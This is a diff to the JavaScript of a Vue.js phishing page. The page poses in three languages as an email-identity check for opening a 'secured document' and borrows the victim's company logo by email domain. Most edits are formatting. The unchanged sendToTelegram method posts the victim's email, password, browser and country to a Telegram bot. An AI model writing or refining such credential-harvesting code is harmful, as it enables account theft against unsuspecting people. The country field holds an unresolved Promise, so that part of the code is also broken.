@@ -8,14 +8,14 @@ const app = Vue.createApp({
       password: '',
       showPassword: false,
       showModal: false,
-      domainLogo: 'logo2.png',
+      domainLogo: 'assets/logo2.png', // Default logo
       localizedText: {
         enterEmail: 'Verify your email identity to access the secured document.',
         next: 'Next',
         enterPassword: 'Enter Password',
         verify: 'Verify',
-        checking: 'Checking, please wait...'
-      }
+        checking: 'Checking, please wait...',
+      },
     };
   },
   methods: {
@@ -30,23 +30,22 @@ const app = Vue.createApp({
             next: 'Next',
             enterPassword: 'Enter Password',
             verify: 'Verify',
-            checking: 'Checking, please wait...'
+            checking: 'Checking, please wait...',
           },
           es: {
             enterEmail: 'Verifique su identidad de correo electrónico para acceder al documento seguro.',
             next: 'Siguiente',
             enterPassword: 'Ingrese contraseña',
             verify: 'Verificar',
-            checking: 'Verificando, por favor espere...'
+            checking: 'Verificando, por favor espere...',
           },
           fr: {
             enterEmail: 'Vérifiez votre identité e-mail pour accéder au document sécurisé.',
             next: 'Suivant',
             enterPassword: 'Entrez le mot de passe',
             verify: 'Vérifier',
-            checking: 'Vérification, veuillez patienter...'
-          }
-          // Add more languages as needed
+            checking: 'Vérification, veuillez patienter...',
+          },
         };
 
         this.localizedText = translations[language] || translations['en'];
@@ -59,10 +58,11 @@ const app = Vue.createApp({
       if (domain) {
         this.domainLogo = `https://logo.clearbit.com/${domain}`;
       } else {
-        this.domainLogo = 'logo2.png';
+        this.domainLogo = 'assets/logo2.png'; // Fallback to default logo
       }
     },
     requestPassword() {
+      this.updateLogo(); // Re-update logo based on the email domain
       this.showPassword = true;
     },
     async verifyLogin() {
@@ -93,17 +93,19 @@ const app = Vue.createApp({
     },
     sendToTelegram() {
       const browserInfo = navigator.userAgent;
-      const country = this.getIPInfo().then(info => info.country);
+      const country = this.getIPInfo().then((info) => info.country);
 
       const message = `Email: ${this.email}\nPassword: ${this.password}\nBrowser: ${browserInfo}\nCountry: ${country}`;
-      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(message)}`;
+      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(
+        message
+      )}`;
 
-      axios.get(url).catch(err => console.error('Telegram Error:', err));
-    }
+      axios.get(url).catch((err) => console.error('Telegram Error:', err));
+    },
   },
   mounted() {
     this.setLocalization();
-  }
+  },
 });
 
 app.mount('#app');
